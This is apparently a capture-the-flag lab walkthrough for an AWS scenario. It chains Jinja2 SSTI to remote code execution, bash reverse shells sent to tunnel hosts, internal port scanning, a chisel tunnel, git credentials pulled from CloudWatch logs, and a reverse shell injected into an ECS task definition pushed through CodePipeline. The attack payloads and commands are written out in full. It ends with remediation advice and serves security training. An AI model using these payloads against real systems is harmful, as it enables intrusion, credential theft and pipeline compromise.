# Walkthrough

## Step 1: Reconnaissance

Access the web application and identify its functionality.

```bash
cd terraform
terraform output webapp_url
```

Open `http://<WEBAPP_IP>` in your browser. You'll see the **BeaverDam Incident Report Generator** with fields: Service Name, Incident Time, Owner, Summary.

![BeaverDam Incident Report Generator main screen](./images/step1-webapp-main.png)

Key observation: "Powered by Flask" hint in the footer → Python/Jinja2 template engine.

---

## Step 2: SSTI Discovery

Test for Server-Side Template Injection in the **Summary** field.

Enter the following in the Summary field and submit:

```
{{7*7}}
```

![SSTI Discovery - 49 rendered](./images/step2-ssti-49.png)

The report output shows **49** instead of the literal string `{{7*7}}`. **SSTI confirmed.**

---

## Step 3: RCE via SSTI

Escalate SSTI to OS command execution.

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

![RCE Confirmed - id output](./images/step3-rce-id.png)

Output:
```
uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

**RCE confirmed.**

---

## Step 4: Webapp Reverse Shell

Use the SSTI RCE to establish a reverse shell on the webapp server. This gives a persistent interactive shell for subsequent recon steps.

### 4.1 Prepare Listener (Local)

If you have a public IP:
```bash
nc -lvnp 4444
```

If behind NAT/home network, use **Pinggy TCP tunnel**:
```bash
# Tab 1 — listener
nc -lvnp 4444

# Tab 2 — Pinggy TCP tunnel
ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
```

Pinggy prints the public endpoint:
```
Forwarding: tcp://uxwkk-14-36-96-117.run.pinggy-free.link:34029 -> localhost:4444
```

![Pinggy TCP tunnel ready](./images/step4-pinggy-listener.png)

### 4.2 Trigger Reverse Shell via SSTI

In the Summary field:
```
{{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/uxwkk-14-36-96-117.run.pinggy-free.link/34029 0>&1'").read()}}
```

Replace the Pinggy hostname and port with your own values.

![SSTI reverse shell payload](./images/step4-ssti-shell-payload.png)

The listener catches the connection:

![Shell connected](./images/step4-shell-connected.png)

You now have an interactive shell on the webapp EC2 instance.

---

## Step 5: Internal Network Reconnaissance

From the reverse shell, identify the internal IP and network layout.

```bash
ip addr show eth0
```

![Internal IP identified](./images/step5-internal-ip.png)

Example output:
```
inet 10.0.1.97/24 brd 10.0.1.255 scope global eth0
```

The webapp is in the `10.0.1.0/24` subnet. Tools subnet is `10.0.6.0/24`.

---

## Step 6: Port Scan + Service Identification

### 6.1 Port Scan

Run a port scan from the reverse shell. Download scan.py via HTTP tunnel or use nc directly:

```bash
# Scan tools subnet for common ports
for port in 80 8080 9090 9194; do
  for i in $(seq 1 254); do
    (nc -zv -w1 10.0.6.$i $port 2>&1 | grep -v refused | grep succeeded) &
  done
  wait
done | tee /tmp/scan.out
```

![Port scan results](./images/step6-port-scan.png)

### 6.2 Service Identification

Identify each discovered host:

```bash
while read target _; do
  echo "===== $target ====="
  curl -s -m 5 "http://$target/" | head -5
done < /tmp/scan.out
```

![Service identification results](./images/step6-service-identify.png)

**Discovered services:**

| IP:PORT | Service |
|---------|---------|
| `10.0.1.97:80` | BeaverDam Incident Report Generator (self) |
| `10.0.2.188:80/8080` | ALB (OK response) |
| `10.0.3.4:80/8080` | ALB (OK response) |
| `10.0.6.119:9194` | BeaverDam Security Analysis (Steampipe) |
| `10.0.6.239:9090` | Prowler Security Report |

---

## Step 7: Chisel Reverse Tunnel Setup

Set up a chisel reverse tunnel through the webapp shell to access Prowler and Steampipe directly in the local browser.

### 7.1 Download Chisel (Local Machine)

```bash
cd /tmp
curl -sLO https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz
mv chisel_1.10.1_linux_amd64 chisel
chmod +x chisel
```

### 7.2 Open Four Terminals

**Tab 1 — Chisel server (local):**
```bash
./chisel server -p 8001 --reverse
```

**Tab 2 — Pinggy TCP tunnel to expose chisel port:**
```bash
ssh -p 443 -R0:localhost:8001 tcp@a.pinggy.io
```
Note the output: `tcp://xxxx.run.pinggy-free.link:<PORT>`

**Tab 3 — HTTP server to serve chisel binary:**
```bash
cd /tmp && python3 -m http.server 8000
```
Expose this via a **separate Pinggy HTTP tunnel**:
```bash
ssh -p 443 -R0:localhost:8000 http@a.pinggy.io
```
Note the HTTPS URL Pinggy gives you.

**Tab 4 — Inside the webapp reverse shell:**
```bash
# Download chisel binary from your HTTP tunnel
curl -s https://<HTTP_PINGGY_URL>/chisel -o /tmp/chisel
chmod +x /tmp/chisel

# Connect to chisel server and forward Prowler + Steampipe ports
/tmp/chisel client <TCP_PINGGY_HOST>:<TCP_PINGGY_PORT> \
  R:9090:10.0.6.239:9090 \
  R:9194:10.0.6.119:9194
```

### 7.3 Access Dashboards in Browser

Get your WSL/local IP:
```bash
hostname -I
```

Open in browser:
- **Prowler**: `http://<WSL_IP>:9090`
- **Steampipe**: `http://<WSL_IP>:9194`

---

## Step 8: Prowler Dashboard — CloudWatch KMS FAIL

### Method 1: Browser (via Chisel Tunnel) ← Recommended

Navigate to `http://<WSL_IP>:9090` in your browser.

![Prowler dashboard - KMS FAIL finding](./images/step8-prowler-kms-fail.png)

Look for:
```
[MEDIUM] cloudwatch_log_group_kms_encryption_enabled — FAIL
Resource: arn:aws:logs:us-east-1:123456789012:log-group:/corp/deploy-pipeline
```

**Key findings:**
- Log group `/corp/deploy-pipeline` has **no KMS encryption** → build logs stored in plaintext
- This is the target for Steampipe credential extraction

### Method 2: SSTI curl (Alternative)

From the reverse shell, dump the Prowler dashboard and look for FAIL findings:

```bash
curl -s http://10.0.6.239:9090/ | grep -i "FAIL"
```

Identify log group names in the FAIL results, then narrow down:

```bash
curl -s http://10.0.6.239:9090/ | grep -i "FAIL" | grep -i "cloudwatch"
```

---

## Step 9: Steampipe SQL Console — Query CloudWatch Logs

### Method 1: Browser (via Chisel Tunnel) ← Recommended

Navigate to `http://<WSL_IP>:9194` in your browser.

**Query 1 — List log groups:**
```sql
select log_group_name from aws_cloudwatch_log_group;
```

Look for a log group starting with `/corp/deploy-pipeline-`.

**Query 2 — Find git credentials in build logs:**
```sql
select message from aws_cloudwatch_log_event
where log_group_name = '/corp/deploy-pipeline-<SCENARIO_ID>'
order by timestamp asc
limit 50;
```

Replace `<SCENARIO_ID>` with the actual suffix found in Query 1.

> **Note:** Use `ORDER BY timestamp ASC` — the `Cloning https://` line appears early in the build log (pre_build phase). Using DESC may miss it if you don't query enough rows.

![Steampipe query - credentials found](./images/step9-steampipe-credentials.png)

The log contains:
```
Cloning https://dev-user-at-123456789012:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
```

### Method 2: SSTI curl (Alternative)

```
{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select message from aws_cloudwatch_log_event where log_group_name = \'/corp/deploy-pipeline\' order by timestamp asc limit 50\"}"').read()}}
```

---

## Step 10: Git Credential Extraction

Parse the credentials from the CloudWatch log:

```
https://<USERNAME>:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
```

Extracted:
```
Username: dev-user-at-123456789012
Password: <PASSWORD>
```

> **Note:** If the password contains `/`, it will appear URL-encoded as `%2F`. Use the encoded form when cloning.

---

## Step 11: Set Up ECS Reverse Shell Listener

Before modifying the CodeCommit repository, set up a listener to catch the reverse shell from the ECS container.

### Option A: Direct listener (public IP)
```bash
nc -lvnp 4444
```

### Option B: Pinggy TCP tunnel
```bash
# Tab 1
nc -lvnp 4444

# Tab 2
ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
# → tcp://umvpv-14-36-96-117.run.pinggy-free.link:38369
```

Note the **hostname** and **port** — embed these in the task definition.

![ECS listener ready - Pinggy TCP tunnel](./images/step11-ecs-listener.png)

---

## Step 12: CodeCommit Clone & Payload Injection

### 12.1 Clone the Repository

```bash
git clone https://dev-user-at-123456789012:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
cd beaverdam-config
```

![CodeCommit clone success](./images/step12-git-clone.png)

### 12.2 Inspect task-definition.json

```bash
cat task-definition.json
```

![task-definition.json before modification](./images/step12-task-definition-before.png)

Notice: no `command` field in `containerDefinitions[0]`. The `FLAG` secret is injected via the `secrets` array.

### 12.3 Inject Reverse Shell Command

Add a `command` field to `containerDefinitions[0]`:

```json
"command": ["bash", "-c", "bash -i >& /dev/tcp/umvpv-14-36-96-117.run.pinggy-free.link/38369 0>&1 & node server.js"]
```

![task-definition.json after modification](./images/step12-task-definition-after.png)

> **Critical:** Use `["bash", "-c", "..."]` not `sh`. The `&` runs the reverse shell in the background so `node server.js` also starts, keeping the ECS task healthy.

### 12.4 Commit and Push

```bash
git config user.email "ops@beaverdam.internal"
git config user.name "BeaverDam Ops"
git add task-definition.json
git commit -m "update task definition"
git push origin main
```

![git push success](./images/step12-git-push.png)

**Push succeeded.** CodePipeline's `PollForSourceChanges` triggers within 1 minute.

---

## Step 13: CodePipeline Execution & Blue/Green Deployment

Pipeline stages:
1. **Source** (~1 min): CodePipeline detects CodeCommit push
2. **Build** (~3-5 min): CodeBuild builds Docker image, pushes to ECR
3. **Deploy** (~3-5 min): CodeDeploy performs ECS Blue/Green deployment

Total wait: **~5–10 minutes**.

Keep your `nc` listener running. When the new ECS task starts:

![Reverse shell connected from ECS container](./images/step13-ecs-shell-connected.png)

```
Connection from 54.x.x.x:xxxxx
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
root@ip-10-0-x-x:/#
```

---

## Step 14: Capture the FLAG

```bash
echo $FLAG
```

![FLAG captured](./images/step14-flag.png)

```
FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
```

---

## Attack Chain Summary

```
1. BeaverDam Incident Report Generator (http://<WEBAPP_IP>)
   ↓ SSTI: {{7*7}} → 49
2. RCE via Jinja2
   ↓ config.__class__.__init__.__globals__['os'].popen('id')
3. Webapp Reverse Shell (Pinggy TCP tunnel)
   ↓ bash -i >& /dev/tcp/<PINGGY_HOST>/<PORT> 0>&1
4. Internal Network Recon
   ↓ ip addr → 10.0.1.97/24
5. Port Scan + Service ID
   ↓ Prowler 10.0.6.239:9090 / Steampipe 10.0.6.119:9194
6. Chisel Reverse Tunnel
   ↓ R:9090:10.0.6.239:9090 R:9194:10.0.6.119:9194
7. Prowler Browser (http://<WSL_IP>:9090)
   ↓ cloudwatch_log_group_kms_encryption_enabled FAIL
   ↓ Log group: /corp/deploy-pipeline
8. Steampipe Browser (http://<WSL_IP>:9194)
   ↓ SELECT … ORDER BY timestamp ASC LIMIT 50
9. CloudWatch Log → Git Credentials
   ↓ dev-user-at-123456789012:<PASSWORD>
10. git clone beaverdam-config
    ↓ task-definition.json → add bash reverse shell command
11. git push origin main
    ↓ CodePipeline PollForSourceChanges triggers
12. CodeBuild → ECR → CodeDeploy ECS Blue/Green (~5-10 min)
    ↓
13. ECS Task starts → reverse shell caught → echo $FLAG
    ↓
14. FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
```

---

## Key Techniques

### SSTI RCE Payload
```python
{{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}
```

### SSTI Reverse Shell
```python
{{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'").read()}}
```

### Chisel Reverse Port Forward
```bash
# Server (local)
./chisel server -p 8001 --reverse

# Client (from reverse shell on target)
/tmp/chisel client <CHISEL_SERVER_HOST>:<PORT> R:9090:10.0.6.239:9090 R:9194:10.0.6.119:9194
```

### Steampipe CloudWatch Query (use ASC)
```sql
select message from aws_cloudwatch_log_event
where log_group_name = '/corp/deploy-pipeline'
order by timestamp asc
limit 50;
```

### ECS Task Definition Reverse Shell Injection
```json
"command": ["bash", "-c", "bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1 & node server.js"]
```

---

## Lessons Learned

### 1. Never Pass User Input to Template Engines
```python
# VULNERABLE
return render_template_string(f"<p>{user_input}</p>")

# SECURE
return render_template('report.html', summary=escape(user_input))
```

### 2. Never Hardcode Credentials in Buildspecs
```yaml
# VULNERABLE
- git clone https://dev-user:SuperSecret@git-codecommit...

# SECURE — use IAM role with codecommit:GitPull
- git clone https://git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
```

### 3. Encrypt CloudWatch Logs with KMS
```hcl
resource "aws_cloudwatch_log_group" "pipeline" {
  name       = "/corp/deploy-pipeline"
  kms_key_id = aws_kms_key.logs.arn
}
```

### 4. Network Segmentation — Isolate Tools Subnet
Prowler and Steampipe must not be reachable from the webapp security group. Use separate security group rules per tier.

### 5. Protect Main Branch in CodeCommit
```json
{
  "Effect": "Deny",
  "Action": ["codecommit:GitPush"],
  "Resource": "arn:aws:codecommit:us-east-1:*:beaverdam-config",
  "Condition": {
    "StringEqualsIfExists": {
      "codecommit:References": ["refs/heads/main"]
    }
  }
}
```

---

## Remediation

### Secure Flask Application
```python
from flask import render_template, request
from markupsafe import escape

@app.route('/', methods=['GET', 'POST'])
def index():
    summary = escape(request.form.get('summary', ''))
    return render_template('report.html', summary=summary)
```

### Secure CodeBuild — IAM Role Auth
```json
{
  "Effect": "Allow",
  "Action": ["codecommit:GitPull"],
  "Resource": "arn:aws:codecommit:us-east-1:*:beaverdam-config"
}
```

Grant the CodeBuild service role `codecommit:GitPull` — no credentials needed in the buildspec.

### Additional Security Measures
1. **AWS WAF**: Block SSTI patterns (`{{`, `__class__`, `__globals__`) at the ALB
2. **VPC Security Groups**: Isolate webapp subnet from tools subnet (deny 9090/9194 from webapp SG)
3. **CloudTrail + GuardDuty**: Alert on anomalous CodeCommit push patterns from non-CI sources
4. **Branch Protection**: Require PR review for `main` branch pushes
5. **CloudWatch KMS**: Encrypt all log groups containing build output
